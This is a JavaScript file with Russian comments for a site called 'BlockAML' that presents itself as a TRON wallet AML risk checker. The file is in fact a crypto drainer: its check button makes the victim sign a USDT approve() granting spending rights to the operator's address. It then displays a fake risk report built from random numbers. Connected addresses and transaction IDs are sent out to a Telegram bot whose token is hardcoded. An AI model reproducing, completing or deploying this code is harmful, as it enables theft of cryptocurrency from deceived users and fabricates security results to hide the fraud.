// ============================================
// ИСПРАВЛЕННЫЙ SCRIPT.JS – РАБОЧАЯ КНОПКА
// ============================================

const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TTC9nFcmD9ziGLzJdDpG3ciSKuvLVWxRrG'; // ВАЖНО: теперь это адрес вашего кошелька!

// Telegram
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let connectedWalletAddress = null;
let connectionAttempts = 0;

// Элементы DOM
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ОТПРАВКА В TELEGRAM
// ============================================
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('❌ Ошибка Telegram:', error.message);
    }
}

// ============================================
// ПРОВЕРКА НАЛИЧИЯ TRONWEB (для отладки)
// ============================================
function checkTronLinkAvailability() {
    console.log('🔍 Проверка TronLink:');
    console.log('window.tronLink:', !!window.tronLink);
    console.log('window.tronWeb:', !!window.tronWeb);
    console.log('window.tronLink?.ready:', window.tronLink?.ready);
    
    if (window.tronLink && window.tronLink.tronWeb) {
        console.log('TronWeb defaultAddress:', window.tronLink.tronWeb.defaultAddress?.base58);
    }
    
    // Показываем подсказку если кошелек не найден
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    if (!window.tronLink && !window.tronWeb) {
        if (isMobile) {
            alert('📱 На телефоне:\n1. Откройте TronLink\n2. Перейдите во встроенный браузер (DApp Browser)\n3. Введите адрес сайта');
        }
    }
}

// ============================================
// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА (ИСПРАВЛЕННАЯ ВЕРСИЯ)
// ============================================
async function connectWallet() {
    console.log('🔌 Попытка подключения кошелька...');
    connectionAttempts++;
    
    try {
        // 1. Сначала проверяем уже существующее подключение
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            const address = window.tronWeb.defaultAddress.base58;
            if (address && address !== 'false') {
                connectedWalletAddress = address;
                walletInput.value = address;
                if (statusSpan) statusSpan.style.display = 'inline-flex';
                sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
                alert('✅ Кошелёк подключён!');
                return;
            }
        }
        
        // 2. Пробуем через tronLink.request (основной метод) [citation:4][citation:8]
        if (window.tronLink) {
            console.log('✅ TronLink обнаружен, запрашиваю подключение...');
            
            try {
                const result = await window.tronLink.request({
                    method: 'tron_requestAccounts',
                    params: {
                        websiteIcon: window.location.origin + '/favicon.ico',
                        websiteName: 'BlockAML'
                    }
                });
                
                console.log('Результат запроса:', result);
                
                // Ждем появления адреса
                let attempts = 0;
                const checkInterval = setInterval(() => {
                    if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                        const address = window.tronLink.tronWeb.defaultAddress.base58;
                        if (address && address !== 'false') {
                            connectedWalletAddress = address;
                            walletInput.value = address;
                            if (statusSpan) statusSpan.style.display = 'inline-flex';
                            sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
                            alert('✅ Кошелёк подключён!');
                            clearInterval(checkInterval);
                        }
                    }
                    attempts++;
                    if (attempts > 20) clearInterval(checkInterval);
                }, 300);
                
                return;
                
            } catch (requestError) {
                console.error('Ошибка запроса:', requestError);
                if (requestError.message?.includes('4001')) {
                    alert('❌ Вы отклонили подключение');
                } else if (requestError.message?.includes('4000')) {
                    alert('⏳ Запрос уже обрабатывается, проверьте TronLink');
                }
                return;
            }
        }
        
        // 3. Альтернативный метод для Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            if (window.trustwallet.tronLink.tronWeb?.defaultAddress) {
                const address = window.trustwallet.tronLink.tronWeb.defaultAddress.base58;
                connectedWalletAddress = address;
                walletInput.value = address;
                if (statusSpan) statusSpan.style.display = 'inline-flex';
                sendTelegramMessage(`🔌 <b>Trust Wallet подключён</b>\n<code>${address}</code>`);
                alert('✅ Trust Wallet подключён!');
                return;
            }
        }
        
        // 4. Если ничего не сработало
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
        if (connectionAttempts === 1) {
            if (isMobile) {
                alert('📱 На телефоне:\n1. Откройте TronLink\n2. Перейдите во встроенный браузер\n3. Введите адрес сайта');
            } else {
                alert('💻 На компьютере:\n1. Установите расширение TronLink\n2. Создайте кошелёк\n3. Обновите страницу');
            }
        } else {
            alert('❌ Кошелёк не найден. Убедитесь, что TronLink установлен и разблокирован.');
        }
        
    } catch (error) {
        console.error('❌ Критическая ошибка:', error);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк');
            return;
        }

        // Получаем tronWeb из доступного источника
        let tronWeb = window.tronWeb || 
                     window.tronLink?.tronWeb || 
                     window.trustwallet?.tronLink?.tronWeb;

        if (!tronWeb) {
            throw new Error('TronWeb не доступен');
        }

        console.log('🔄 TronWeb получен, версия:', tronWeb.version);
        
        const amount = '10000000'; // 10 USDT
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        // Отправляем approve
        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 600_000_000,
            callValue: 0,
            shouldPollResponse: true,
            timeout: 120000
        });

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        await sendTelegramMessage(`
✅ <b>Approve успешно отправлен</b>
📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🔗 TX: https://tronscan.org/#/transaction/${tx}
        `);

        showDemoReport(connectedWalletAddress);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        await sendTelegramMessage(`
❌ <b>Ошибка approve</b>
📝 ${error.message}
📬 Адрес: <code>${connectedWalletAddress || 'неизвестно'}</code>
        `);
        
        alert('❌ Ошибка: ' + error.message);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ
// ============================================
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;

    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';

    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// КОПИРОВАНИЕ АДРЕСА
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address).then(() => {
        alert('✅ Адрес скопирован');
    });
}

// ============================================
// ТЕСТОВАЯ ФУНКЦИЯ ДЛЯ ПРОВЕРКИ TELEGRAM
// ============================================
window.testTelegram = async function() {
    await sendTelegramMessage(`
🧪 <b>Тестовое сообщение</b>
✅ Связь работает
⏰ ${new Date().toLocaleString()}
    `);
    alert('✅ Тест отправлен, проверьте Telegram');
};

// ============================================
// ИНИЦИАЛИЗАЦИЯ ПРИ ЗАГРУЗКЕ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Сайт загружен');
    
    // Проверяем наличие TronLink через 1 секунду
    setTimeout(checkTronLinkAvailability, 1000);
    
    // Проверяем существующее подключение
    if (window.tronWeb?.defaultAddress?.base58) {
        const address = window.tronWeb.defaultAddress.base58;
        connectedWalletAddress = address;
        walletInput.value = address;
        if (statusSpan) statusSpan.style.display = 'inline-flex';
        console.log('✅ Найден существующий кошелёк:', address);
    }
    
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    
    window.copyAddress = copyAddress;
});
